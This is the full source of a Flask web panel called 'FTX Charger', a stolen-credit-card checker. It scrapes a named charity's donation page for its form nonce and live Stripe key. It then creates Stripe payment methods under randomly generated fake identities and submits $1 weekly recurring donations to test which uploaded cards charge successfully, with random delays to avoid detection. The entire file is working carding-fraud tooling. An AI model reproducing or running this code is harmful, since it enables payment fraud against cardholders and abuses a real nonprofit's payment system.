# app.py
from flask import Flask, request, render_template_string, redirect, url_for, session, jsonify
import os
import re
import time
import random
import string
import threading
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ─── SHARED STATE ───────────────────────────────────────────────────────
check_results = []
is_checking = False
stop_flag = False
total_cards = 0
check_lock = threading.Lock()

def random_name():
    firsts = ["Ahmed", "Mohamed", "Sarah", "Omar", "Layla", "Youssef", "Fatima"]
    lasts  = ["Khalil", "Abdullah", "Smith", "Johnson", "Garcia", "Lopez", "Bennett"]
    return random.choice(firsts), random.choice(lasts)

def random_address():
    cities  = ["New York", "Los Angeles", "Chicago", "Houston"]
    states  = ["NY", "CA", "IL", "TX"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St"]
    zips    = ["10001", "90001", "60601", "77001"]
    i = random.randrange(len(cities))
    return cities[i], states[i], f"{random.randint(10,9999)} {random.choice(streets)}", zips[i]

def random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=14)) + "@gmail.com"

def check_ccs(cc_lines):
    global is_checking, stop_flag, total_cards

    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"

    with check_lock:
        total_cards = len(cc_lines)
        check_results.clear()
        is_checking = True
        stop_flag = False

    s = requests.Session()

    for idx, line in enumerate(cc_lines, 1):
        with check_lock:
            if stop_flag:
                check_results.append((idx, line.strip(), "STOPPED BY USER"))
                break

        line = line.strip()
        if '|' not in line:
            continue

        try:
            num, mm, yy_full, cvc = [x.strip() for x in line.split('|')]
            yy = yy_full[-2:]
            ccstr = line
        except:
            check_results.append((idx, line, "BAD FORMAT"))
            continue

        try:
            r = s.get("https://pipelineforchangefoundation.com/donate/", headers={"User-Agent": ua}, timeout=15)
            soup = BeautifulSoup(r.text, "html.parser")

            formid = soup.find("input", {"name": "charitable_form_id"})["value"]
            nonce  = soup.find("input", {"name": "_charitable_donation_nonce"})["value"]
            cap    = soup.find("input", {"name": "campaign_id"})["value"]
            pk_live_match = re.search(r'"key":"(pk_live_[^"]+)"', r.text)
            pk_live = pk_live_match.group(1) if pk_live_match else None
            if not pk_live:
                check_results.append((idx, ccstr, "No pk_live found"))
                continue
        except Exception as e:
            check_results.append((idx, ccstr, f"PAGE ERROR — {str(e)[:70]}"))
            continue

        fn, ln = random_name()
        city, state, addr, zipc = random_address()
        email = random_email()

        pm_data = {
            "type": "card",
            "billing_details[name]": f"{fn} {ln}",
            "billing_details[email]": email,
            "billing_details[address][city]": city,
            "billing_details[address][country]": "US",
            "billing_details[address][line1]": addr,
            "billing_details[address][postal_code]": zipc,
            "billing_details[address][state]": state,
            "card[number]": num,
            "card[cvc]": cvc,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "key": pk_live,
        }

        try:
            pm_r = requests.post("https://api.stripe.com/v1/payment_methods", data=pm_data, headers={"User-Agent": ua}, timeout=12)
            pm_id = pm_r.json()["id"]
        except Exception as e:
            check_results.append((idx, ccstr, f"PM FAIL — {str(e)[:80]}"))
            continue

        donation_data = {
            "charitable_form_id": formid,
            formid: "",
            "_charitable_donation_nonce": nonce,
            "campaign_id": cap,
            "description": "Donate",
            "ID": "742502",
            "recurring_donation": "yes",
            "donation_amount": "recurring-custom",
            "custom_recurring_donation_amount": "1.00",
            "recurring_donation_period": "week",
            "first_name": fn,
            "last_name": ln,
            "email": email,
            "address": addr,
            "city": city,
            "state": state,
            "postcode": zipc,
            "country": "US",
            "gateway": "stripe",
            "stripe_payment_method": pm_id,
            "action": "make_donation",
        }

        try:
            ajax_r = s.post(
                "https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php",
                data=donation_data,
                headers={
                    "User-Agent": ua,
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://pipelineforchangefoundation.com/donate/",
                },
                timeout=20
            )

            txt = ajax_r.text.lower()
            if "thank you" in txt or "successfully" in txt:
                status = "CHARGED 1.00$ ✅"
            elif "requires_action" in txt:
                status = "3DS / ACTION REQUIRED"
            else:
                status = f"DECLINED / {txt[:140]}..."
        except Exception as e:
            status = f"REQUEST FAIL — {str(e)[:90]}"

        check_results.append((idx, ccstr, status))
        time.sleep(random.uniform(4.5, 9.5))

    with check_lock:
        is_checking = False

# ─── HTML TEMPLATES ─────────────────────────────────────────────────────

LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - FTX Panel</title>
  <style>
    body {font-family:sans-serif; background:#0d1117; color:#e6e6e6; min-height:100vh; margin:0; display:flex; align-items:center; justify-content:center;}
    .card {background:#161b22; padding:3rem 2.5rem; border-radius:16px; border:1px solid #30363d; box-shadow:0 20px 60px #000; max-width:420px; width:90%;}
    h1 {color:#00d4ff; text-align:center; margin-bottom:2rem; font-size:2.4rem; letter-spacing:2px;}
    input {width:100%; padding:1rem; margin:1rem 0; background:#0d1117; border:1px solid #30363d; border-radius:8px; color:white; font-size:1rem;}
    input:focus {border-color:#00d4ff; outline:none; box-shadow:0 0 0 3px rgba(0,212,255,0.3);}
    button {width:100%; padding:1.1rem; background:#0066cc; color:white; border:none; border-radius:8px; font-weight:bold; cursor:pointer; transition:0.3s;}
    button:hover {background:#0080ff; transform:translateY(-2px);}
    .error {color:#ff5555; text-align:center; margin-top:1rem;}
  </style>
</head>
<body>
  <div class="card">
    <h1>FTX Panel</h1>
    <form method="POST">
      <input type="text" name="username" placeholder="Username" required autofocus>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">LOGIN</button>
    </form>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
  </div>
</body>
</html>"""

PANEL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FTX Charger</title>
  <style>
    body {font-family:sans-serif; background:#0d1117; color:#e6e6e6; min-height:100vh; margin:0; padding:2rem 1rem;}
    .container {max-width:1100px; margin:0 auto;}
    h1 {color:#00d4ff; text-align:center; font-size:2.8rem; margin-bottom:0.5rem; letter-spacing:2px;}
    .subtitle {text-align:center; color:#8b949e; margin-bottom:2rem;}
    .card {background:#161b22; border:1px solid #30363d; border-radius:16px; padding:2rem; margin-bottom:2rem; box-shadow:0 15px 40px #000;}
    input[type="file"] {width:100%; padding:1.2rem; background:#0d1117; border:2px dashed #30363d; border-radius:10px; color:#e6e6e6; cursor:pointer;}
    button {padding:1rem 2.2rem; background:#0066cc; color:white; border:none; border-radius:8px; font-weight:bold; cursor:pointer; transition:0.3s; font-size:1.1rem;}
    button:hover {background:#0080ff; transform:translateY(-2px);}
    button.stop {background:#c94d4d;}
    button.stop:hover {background:#e06666;}
    textarea {width:100%; height:280px; background:#0d1117; color:#d0ffd0; border:1px solid #30363d; border-radius:10px; padding:1.2rem; font-family:monospace; margin:1.2rem 0; resize:vertical;}
    table {width:100%; border-collapse:collapse; margin-top:1.5rem;}
    th, td {padding:12px; text-align:left; border-bottom:1px solid #30363d;}
    th {background:#21262d; color:#00d4ff;}
    .success {color:#00ff9d; font-weight:bold;}
    .danger  {color:#ff5555; font-weight:bold;}
    .warn    {color:#ffcc00;}
    .status {text-align:center; font-size:1.3rem; margin:1.5rem 0; color:#a0ffc0;}
  </style>
</head>
<body>
  <div class="container">
    <h1>FTX CHARGER</h1>
    <p class="subtitle">Stripe 1$ Recurring Donation Checker</p>

    <div class="card">
      {% if not is_checking %}
      <form method="post" enctype="multipart/form-data">
        <input type="file" name="ccfile" accept=".txt" required>
        <div style="text-align:center; margin-top:1.5rem;">
          <button type="submit">START CHECKING</button>
        </div>
      </form>
      {% else %}
      <div class="status">Processing {{ len(check_results) }} / {{ total_cards }} cards</div>
      <div style="text-align:center;">
        <button class="stop" onclick="stopChecking()">STOP CHECKING</button>
      </div>
      {% endif %}
    </div>

    {% if check_results %}
    <div class="card">
      <button onclick="copyResults()">Copy All Results</button>
      <textarea id="results">{{ '\n'.join([f"{i} | {cc} | {res}" for i,cc,res in check_results]) }}</textarea>

      <table>
        <tr><th>#</th><th>CC</th><th>Result</th></tr>
        {% for i, cc, res in check_results %}
        <tr>
          <td>{{ i }}</td>
          <td style="font-family:monospace;">{{ cc }}</td>
          <td class="{% if 'CHARGED' in res %}success{% elif 'DECLINED' in res or 'FAIL' in res %}danger{% else %}warn{% endif %}">{{ res }}</td>
        </tr>
        {% endfor %}
      </table>
    </div>
    {% endif %}
  </div>

  <script>
    function copyResults() {
      navigator.clipboard.writeText(document.getElementById("results").value)
        .then(() => alert("Copied to clipboard"));
    }
    function stopChecking() {
      if (confirm("Stop now?")) {
        fetch("/stop", {method: "POST"})
          .then(() => location.reload());
      }
    }
    {% if is_checking %}
    setTimeout(() => location.reload(), 7000);
    {% endif %}
  </script>
</body>
</html>"""

@app.route("/", methods=["GET", "POST"])
def login():
    try:
        if request.method == "POST":
            u = request.form.get("username", "").strip()
            p = request.form.get("password", "").strip()
            if u == "admin" and p == "ftx123":
                session["logged"] = True
                return redirect("/panel")
            return render_template_string(LOGIN_HTML, error="Invalid credentials")
        return render_template_string(LOGIN_HTML)
    except Exception as e:
        return f"<h2 style='color:red'>Login error</h2><pre>{str(e)}</pre>", 500

@app.route("/panel", methods=["GET", "POST"])
def panel():
    global is_checking, stop_flag

    try:
        if not session.get("logged"):
            return redirect("/")

        if request.method == "POST" and not is_checking:
            f = request.files.get("ccfile")
            if f and f.filename.lower().endswith(".txt"):
                try:
                    lines = [l.decode("utf-8", errors="ignore").strip() for l in f.stream if b'|' in l]
                    if lines:
                        threading.Thread(target=check_ccs, args=(lines,), daemon=True).start()
                except:
                    pass  # silent fail

        return render_template_string(PANEL_HTML,
                                     is_checking=is_checking,
                                     check_results=check_results,
                                     total_cards=total_cards)
    except Exception as e:
        return f"<h2 style='color:red'>Panel error</h2><pre>{str(e)}</pre>", 500

@app.route("/stop", methods=["POST"])
def stop():
    global stop_flag
    with check_lock:
        stop_flag = True
    return jsonify({"status": "stop requested"})

# ────────────────────────────────────────────────────────────────
#   LOCAL DEVELOPMENT ONLY – comment out / remove for Vercel
# ────────────────────────────────────────────────────────────────
# if __name__ == '__main__':
#     app.run(debug=True, host="0.0.0.0", port=5000)
